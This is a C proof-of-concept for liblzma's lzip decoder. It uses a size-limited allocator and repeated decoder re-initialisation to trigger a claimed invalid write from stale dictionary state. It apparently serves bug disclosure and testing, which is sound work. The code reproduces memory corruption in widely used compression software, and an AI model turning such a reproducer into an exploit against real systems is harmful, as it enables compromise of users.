// PoC: reinit of lzma_lzip_decoder after a prior init failed with
// LZMA_MEM_ERROR (allocator refusing a large dictionary allocation)
// reuses a stale dictionary state -> invalid write on the next lzma_code().
#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ALLOC_REFUSE_ABOVE ((size_t)64 << 20)

static void *
alloc_fn(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	if (size != 0 && nmemb > ALLOC_REFUSE_ABOVE / size)
		return NULL;
	return malloc(nmemb * size);
}

static void
free_fn(void *opaque, void *ptr)
{
	(void)opaque;
	free(ptr);
}

static const lzma_allocator test_allocator = {
	.alloc = &alloc_fn,
	.free = &free_fn,
	.opaque = NULL,
};

// Feed a complete .lz member header with the given dictionary-size byte.
static lzma_ret
feed_header(lzma_stream *strm, uint8_t dict_byte)
{
	uint8_t hdr[6] = { 'L', 'Z', 'I', 'P', 1, dict_byte };
	uint8_t out[128];

	strm->next_in = hdr;
	strm->avail_in = sizeof(hdr);
	strm->next_out = out;
	strm->avail_out = sizeof(out);

	return lzma_code(strm, LZMA_RUN);
}

int
main(void)
{
	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &test_allocator;
	lzma_ret ret;

	// Dictionary-size byte: low 5 bits are log2 of the dict size,
	// high 3 bits a fractional part. 0x17 -> 2^23 = 8 MiB,
	// 0x1C -> 2^28 = 256 MiB (refused by the test allocator).

	ret = lzma_lzip_decoder(&strm, UINT64_MAX, 0);
	printf("init 1: %d\n", ret);
	ret = feed_header(&strm, 0x17);
	printf("member with 8 MiB dict: %d\n", ret);

	// Public reinit without lzma_end().
	ret = lzma_lzip_decoder(&strm, UINT64_MAX, 0);
	printf("init 2: %d\n", ret);
	ret = feed_header(&strm, 0x1C);
	printf("member with 256 MiB dict: %d (expect LZMA_MEM_ERROR=%d)\n",
			ret, LZMA_MEM_ERROR);

	// Public reinit without lzma_end().
	ret = lzma_lzip_decoder(&strm, UINT64_MAX, 0);
	printf("init 3: %d\n", ret);
	ret = feed_header(&strm, 0x17);
	printf("member with 8 MiB dict again: %d\n", ret);

	lzma_end(&strm);
	printf("done\n");
	return 0;
}
